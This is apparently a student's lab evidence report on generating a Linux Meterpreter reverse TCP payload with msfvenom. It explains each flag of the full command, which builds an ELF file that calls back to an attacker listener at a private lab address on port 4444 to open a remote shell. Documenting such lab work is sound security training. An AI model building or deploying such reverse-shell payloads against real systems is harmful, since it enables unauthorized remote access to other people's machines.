# Evidence 01 — msfvenom Payload

## Objective

The objective of this step was to understand how `msfvenom` is used to generate a Metasploit-compatible payload for an authorized laboratory environment.

## Tool

    msfvenom

## What is msfvenom?

`msfvenom` is a Metasploit Framework utility used to generate and customize payloads.

A payload defines the code and communication behavior that is delivered to an authorized target during a controlled security assessment.

## Payload Concept

For this laboratory exercise, a Linux Meterpreter Reverse TCP payload was used to demonstrate the payload-generation workflow.

The payload was configured with:

    LHOST = 192.168.164.128
    LPORT = 4444

Where:

- `LHOST` represents the Kali Linux listener address.
- `LPORT` represents the TCP port on which the listener is configured.

## Command Used

    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.164.128 LPORT=4444 -f elf -o payload.elf

## Command Explanation

### -p

Specifies the payload to generate.

    linux/x86/meterpreter/reverse_tcp

This payload is intended for an authorized 32-bit Linux laboratory target and uses a Reverse TCP communication model with a Meterpreter session.

### LHOST

Specifies the address to which the payload attempts to connect back.

    LHOST=192.168.164.128

This is the Kali Linux attacker/listener address in the laboratory network.

### LPORT

Specifies the TCP port used for the reverse connection.

    LPORT=4444

### -f elf

Specifies ELF as the output format.

ELF is a common executable format used on Linux systems.

### -o

Specifies the output filename.

    payload.elf

## Payload Generation Result

The command generated the payload file:

    payload.elf

The generated file was intended only for use inside the authorized laboratory environment.

## Security Relevance

Understanding payload generation helps a security professional understand how exploitation frameworks establish communication channels after code execution.

The payload itself does not automatically establish a session. A compatible listener must be configured to receive the connection.

The next phase of this practical therefore uses Metasploit's `exploit/multi/handler`.

## Evidence Screenshot

The following screenshot provides evidence of the `msfvenom` payload-generation command and its output.

![msfvenom Payload Generation](../screenshots/01-msfvenom-payload.png)

## Result

A Metasploit-compatible Linux Meterpreter Reverse TCP payload was successfully generated for the authorized laboratory environment.

## Conclusion

The `msfvenom` payload-generation phase demonstrated how payload type, architecture, connection method, listener address, listener port, and output format are specified when creating a payload for controlled security testing.

## Authorization

This activity was performed exclusively within an authorized cybersecurity laboratory environment for educational and security-training purposes.

No unauthorized systems were targeted.
